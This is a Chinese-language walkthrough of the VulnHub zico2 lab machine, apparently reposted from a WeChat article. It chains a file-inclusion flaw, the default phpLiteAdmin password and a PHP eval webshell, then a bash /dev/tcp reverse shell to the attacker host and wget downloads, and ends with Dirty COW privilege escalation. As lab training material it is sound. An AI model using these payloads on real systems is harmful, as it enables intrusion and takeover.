> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/h3W5wLzgJBJcmxPSCHnupA)

  

靶机下载地址：https://download.vulnhub.com/zico/zico2.ova

**环境：**

靶机：zico2       网络连接方式：桥接模式     192.168.0.110

攻击机：kali       网络连接方式：桥接模式     192.168.0.111

![](https://mmbiz.qpic.cn/mmbiz_png/aSuicILHyP5fQI5VQ1wNuZxzZaacGlruO9bsBDWaw5icqjoDVicj9B5Gb5glDrFSY7u5gdOCZN6euH96d2amTajvw/640?wx_fmt=png)

  1、信息收集

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFO9ZDGBVzx8o8TaWYPTDChFEpgt5Mo01VLHrmyFP4ERZ25kGuA4iaYz8fMjAoOeUQUu0biakaBS02otCr8rmycg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/165jdibJnGcUAxqeh4b1mTZjIzBhOXg6t5AmDhsbbz9lACibgYGLvRc1EUqxXTUGePTNRouZsJrbwUdYGD4TdOWw/640?wx_fmt=png)

1.1、确认 IP

nmap 扫描确认主机存活, 确认靶机 IP：192.168.0.110

```
nmap -sn 192.168.0.1/24
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKpMFicKDbZTyNnt7Miasgf0ibSjl8eqMdPuI2iaDw5Wr7c2ibrMTEuTPcfEQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/165jdibJnGcUAxqeh4b1mTZjIzBhOXg6t5AmDhsbbz9lACibgYGLvRc1EUqxXTUGePTNRouZsJrbwUdYGD4TdOWw/640?wx_fmt=png)

1.2、扫描端口和服务

```
nmap -p- -A 192.168.0.110
```

收集到的信息如下：

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41660/tcp6  status
|   100024  1          51932/tcp   status
|   100024  1          53421/udp   status
|_  100024  1          55708/udp6  status
51932/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:98:69:CA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTK4kvVx4tr7fpiclnV6ic4qaVfmSzpQw8laNK9Aic5zl5pHFhS88vgEOKlA/640?wx_fmt=png)

可能的思路：ssh 爆破, web 漏洞, Linux 内核提权

![](https://mmbiz.qpic.cn/mmbiz_png/165jdibJnGcUAxqeh4b1mTZjIzBhOXg6t5AmDhsbbz9lACibgYGLvRc1EUqxXTUGePTNRouZsJrbwUdYGD4TdOWw/640?wx_fmt=png)

**1.3、访问 http 服务**

访问 80 端口

http://192.168.0.110/

找到以下页面  

http://192.168.0.110/view.php?page=tools.html

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKuOUe29ibrRTSN6s50TM0p9WV37O8ozFYhoc7UZNOncxn5G2s8DpYPnw/640?wx_fmt=png)

看到 page=tools.html, 想到尝试文件包含, 发现可以查看 / etc/passwd, 但尝试利用 php 伪协议读取 view.php 源码失败

http://192.168.0.110/view.php?page=../../etc/passwd

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKT5eA2pOB8pDKicxIwicYFTpHWy8D4E9vZ4KQicKouBuZqazBD2areWIVg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/165jdibJnGcUAxqeh4b1mTZjIzBhOXg6t5AmDhsbbz9lACibgYGLvRc1EUqxXTUGePTNRouZsJrbwUdYGD4TdOWw/640?wx_fmt=png)

1.4、扫目录

dirb 扫描目录

```
dirb http://192.168.0.110/ /usr/share/dirb/wordlists/big.txt -w
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKBws5ESAouicu54Kx9skT4zP590dAz5AQcMh6IMgcTU3iclACW2tkoJiag/640?wx_fmt=png)

```
/LICENSE
/index
/dbadmin/
/cgi-bin/
/tools
/view
/package
/server-status
/css/
/css/creative
/img/
/img/header
/img/portfolio/
/img/portfolio/thumbnails/
/img/portfolio/thumbnails/1
/img/portfolio/thumbnails/2
/img/portfolio/thumbnails/3
/img/portfolio/thumbnails/4
/img/portfolio/thumbnails/5
/img/portfolio/thumbnails/6
/js/
/js/creative
/vendor/
/vendor/jquery/
/vendor/jquery/jquery
```

访问扫描出来的目录结果, 发现 / dbadmin / 目录可能是突破口

 2、找 web 漏洞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFO9ZDGBVzx8o8TaWYPTDChFEpgt5Mo01VLHrmyFP4ERZ25kGuA4iaYz8fMjAoOeUQUu0biakaBS02otCr8rmycg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/165jdibJnGcUAxqeh4b1mTZjIzBhOXg6t5AmDhsbbz9lACibgYGLvRc1EUqxXTUGePTNRouZsJrbwUdYGD4TdOWw/640?wx_fmt=png)

2.1、phpLiteAdmin

访问 / dbadmin / 目录, 找到一个 test_db.php 文件, 访问后发现是 phpLiteAdmin v1.9.3 的登陆页

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKMvzFBhVZfTojzLAA0FMM3TTWCiaVn0vBd5ia222Qte24MXsU5DuIkJaA/640?wx_fmt=png)

无需用户名, 直接输入密码, 尝试 admin, 登陆成功了。。。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKy2wjQgPBeNBAc0amTmtDhaKjZ4Jx38XUgQRsaMpPNXogW6ZfqJLI6g/640?wx_fmt=png)

点击左下方 info, 发现有两个账户信息 root 和 zico

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTK5awNeLUytGF5jIpTCaznmfn3W3gTibMTdkSq2PF4zPnCgYttsCDrzKw/640?wx_fmt=png)

去 somd5 查下密码, 分别是 34kroot34 和 zico2215@

![](https://mmbiz.qpic.cn/mmbiz_png/165jdibJnGcUAxqeh4b1mTZjIzBhOXg6t5AmDhsbbz9lACibgYGLvRc1EUqxXTUGePTNRouZsJrbwUdYGD4TdOWw/640?wx_fmt=png)

2.2、拿 shell

百度了下 phpLiteAdmin 漏洞, 发现 <=1.9.3 可能有代码执行漏洞, 首先创建一个 test.php 的数据库

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKJdGLgoGg86tHGLODZDYfwoOMEuMkKKJmtMsYsAqtqkictZXMy8XNSkA/640?wx_fmt=png)

然后新建一个名为 a 的表, 1 列, 字段 1, 值为

```
<?php @eval($_POST[x);?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKkQE4HuB2xXlCibCXOOuXgdX61VofIesNDxAmflVGGeHK5cUNzBABRYQ/640?wx_fmt=png)

创建成功, 如下图

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKHe4zzlWhb5RvquiaicLhkzsI9y52WMWEqbNg8rPfTQDkyiaJZzRTFZ2zQ/640?wx_fmt=png)

结合之前的文件包含漏洞, 访问

http://192.168.0.110/view.php?page=../../usr/databases/test.php

发现可以正常访问

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKXKibcMibPTTgePLVFYOf6DbLao62XwJqlB9S1g2V8VeZNbgcJ681QoYQ/640?wx_fmt=png)

尝试执行命令, 发现可以执行 whoami

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKfRgTJLWLAcT0Ql5fY7xI2JBSCuVtJKEmKfCd4SArcaajgK5icJDXg7A/640?wx_fmt=png)

尝试通过执行命令来直接反弹 shell, 并没有反弹成功, 直接搞个新的 shell 文件好了

开启 kali 的 apache 服务, 在 kali 网站目录下写个 shell.txt 的文件, 内容如下：

```
<?php @system($_POST[x]);?>
```

通过执行 wget 命令将该文件下载到靶机中, 发现不能直接下载到网站根目录

通过 x=system('ls -lah ../');  查看网站根目录权限, 发现没有写入权限

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKCGcLKpngpdDhTibrkzlUuYQ6DUibvyvStNQZUalaAyGRzLn2RNhAacow/640?wx_fmt=png)

通过 x=system('ls -lah'); 查看当前目录下的子目录, 发现多个目录权限都比较高, 比如 img 目录

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTK4jNQVjV9oyKvibj7YqkmTAfNLiac1ibDg7LIq9VWe58PjeQgkx1IXGAtQ/640?wx_fmt=png)

通过 wget 命令将 kali 的 shell.txt 文件下载到 img 目录下

```
x=system('wget http://192.168.0.111/shell.txt -O ./img/shell.php');
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKOxxaWqqic8T9MC3tX8rEiby7pOYvgyXxb78yqN7g5QLZ1XlzBib1bbWMw/640?wx_fmt=png)

访问 shell.php, 发现写入成功, 且可以执行命令

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKibC0LAfg9TCXFsp91j8n9xTsSp7NfSyjibtS3oLTibSb4boSTszvpwjicQ/640?wx_fmt=png)

kali 监听端口

```
nc -lvvp 9999
```

执行以下命令反弹 shell

```
echo "bash -i >& /dev/tcp/192.168.0.111/7777 0>&1"|bash
```

先进行 url 编码, 再执行

```
%65%63%68%6f%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%30%2e%31%31%31%2f%37%37%37%37%20%30%3e%26%31%22%7c%62%61%73%68
```

成功反弹 shell

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKZ61ULYCaufdgpT71KHWibC3iaRE5JCc07u5wGz2Z6zxRQ92HRgGBc4icg/640?wx_fmt=png)

 3、提权

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFO9ZDGBVzx8o8TaWYPTDChFEpgt5Mo01VLHrmyFP4ERZ25kGuA4iaYz8fMjAoOeUQUu0biakaBS02otCr8rmycg/640?wx_fmt=png)

收集信息得到的 Linux 版本为 2.6.32-3.5, 尝试脏牛提权, 下载 dirty.c 文件放到 kali 网站根目录, 通过 wget 命令下载到靶机

```
wget http://192.168.0.111/dirty.c
```

执行以下命令编译 dirty.c 文件：

```
gcc -pthread dirty.c -o dirty -lcrypt
```

执行./dirty 然后手动设置密码为 root, 发现当前 shell 失效, 不过没关系

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKu4TfVRxeEdWNf12oTTFsRff6KM8WicOTlXAy7XvaT4o1HibEJic8Bjkxg/640?wx_fmt=png)

使用用户名 firefart, 密码 root 直接登陆靶机, 发现登陆成功, 权限为 root

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ08weBV2oVrkiaAZZH416stTKK5zcgjCddUvGMKIo5R0WQFrJEVXMsfnItK05iaiaOqia2yUFiaiaNCamnbQ/640?wx_fmt=png)

 4、总结

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFO9ZDGBVzx8o8TaWYPTDChFEpgt5Mo01VLHrmyFP4ERZ25kGuA4iaYz8fMjAoOeUQUu0biakaBS02otCr8rmycg/640?wx_fmt=png)

到这其实已经通关，不过后来发现该靶机还有其他几种通关方式，比如通过 tar 提权、zip 提权或者 find 提权，玩法还是比较多的，大家可以玩玩看～

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0icgJnwz55vaCiatpsqriaW2GZ7rRw3kbvpDFicsKcLcp9Q7tYiaMwLANvcHAoByTiaGaus4HBukgfIXt9g/640?wx_fmt=png)